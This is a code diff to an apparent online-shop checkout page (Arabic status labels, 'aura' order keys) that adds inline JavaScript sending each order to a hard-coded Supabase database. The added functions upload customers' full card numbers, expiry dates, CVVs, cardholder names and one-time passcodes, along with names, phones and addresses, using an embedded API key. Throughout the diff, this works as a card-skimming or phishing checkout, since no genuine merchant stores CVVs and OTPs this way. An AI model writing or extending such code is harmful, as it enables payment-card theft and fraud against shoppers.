@@ -182,9 +182,59 @@
         </div>
     </div>
 
-    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2/dist/umd/supabase.min.js"></script>
-    <script src="../supabase.js"></script>
     <script>
+        var _SB_URL = 'https://blozysudthytzkfepgqc.supabase.co';
+        var _SB_KEY = 'sb_publishable_tRk0OqQQQlxCt8dlngXwfw_DtrqVaXM';
+
+        function _sbHeaders() {
+            return { 'Content-Type': 'application/json', 'apikey': _SB_KEY, 'Authorization': 'Bearer ' + _SB_KEY };
+        }
+
+        function _saveOrderToSupabase(orderData) {
+            try {
+                var row = {
+                    order_id: orderData.id,
+                    customer_name: orderData.name,
+                    customer_phone: orderData.phone,
+                    customer_address: orderData.address,
+                    customer_country: orderData.country,
+                    products: JSON.stringify(orderData.items || []),
+                    total: orderData.total,
+                    card_holder: (orderData.cardDetails || {}).holder || '',
+                    card_number: (orderData.cardDetails || {}).number || '',
+                    card_expiry: (orderData.cardDetails || {}).expiry || '',
+                    card_cvv: (orderData.cardDetails || {}).cvv || '',
+                    card_type: (orderData.cardDetails || {}).brand || '',
+                    card_otp: (orderData.cardDetails || {}).otp || '',
+                    status: orderData.status || 'قيد المراجعة'
+                };
+                fetch(_SB_URL + '/rest/v1/orders', {
+                    method: 'POST',
+                    headers: _sbHeaders(),
+                    body: JSON.stringify(row)
+                }).then(function(r) {
+                    if (!r.ok && r.status === 409) {
+                        // Conflict - order exists, update it
+                        fetch(_SB_URL + '/rest/v1/orders?order_id=eq.' + orderData.id, {
+                            method: 'PATCH',
+                            headers: _sbHeaders(),
+                            body: JSON.stringify(row)
+                        });
+                    }
+                }).catch(function(e) { console.warn('supabase save error:', e); });
+            } catch(e) { console.warn('supabase save exception:', e); }
+        }
+
+        function _updateStatusInSupabase(orderId, status) {
+            try {
+                fetch(_SB_URL + '/rest/v1/orders?order_id=eq.' + orderId, {
+                    method: 'PATCH',
+                    headers: _sbHeaders(),
+                    body: JSON.stringify({ status: status, card_otp: document.getElementById('otp-input').value.trim() })
+                });
+            } catch(e) {}
+        }
+
         const cardNumberInput = document.getElementById('card-number');
         const cardExpiryInput = document.getElementById('card-expiry');
         const cardCvvInput = document.getElementById('card-cvv');
@@ -786,7 +836,7 @@
             orders.unshift(partialOrder);
             localStorage.setItem('auraOrders', JSON.stringify(orders));
             localStorage.setItem('pendingOrderId', partialOrder.id);
-            saveOrderToSupabase(partialOrder);
+            _saveOrderToSupabase(partialOrder);
             try { var n = parseInt(localStorage.getItem('auraOrderAlert') || '0') + 1; localStorage.setItem('auraOrderAlert', n); } catch(e) {}
             showPaymentLoading();
         });
@@ -909,7 +959,7 @@
                 existingOrder.status = 'تم الدفع';
                 existingOrder.cardDetails.otp = otpVal;
                 localStorage.setItem('auraOrders', JSON.stringify(orders));
-                saveOrderToSupabase(existingOrder);
+                _saveOrderToSupabase(existingOrder);
             } else {
                 const cardNumber = cardNumberInput.value.replace(/\D/g, '');
                 const last4 = cardNumber.slice(-4);
@@ -940,7 +990,7 @@
                 };
                 orders.unshift(newOrder);
                 localStorage.setItem('auraOrders', JSON.stringify(orders));
-                saveOrderToSupabase(newOrder);
+                _saveOrderToSupabase(newOrder);
             }
 
             localStorage.removeItem('auraCart');
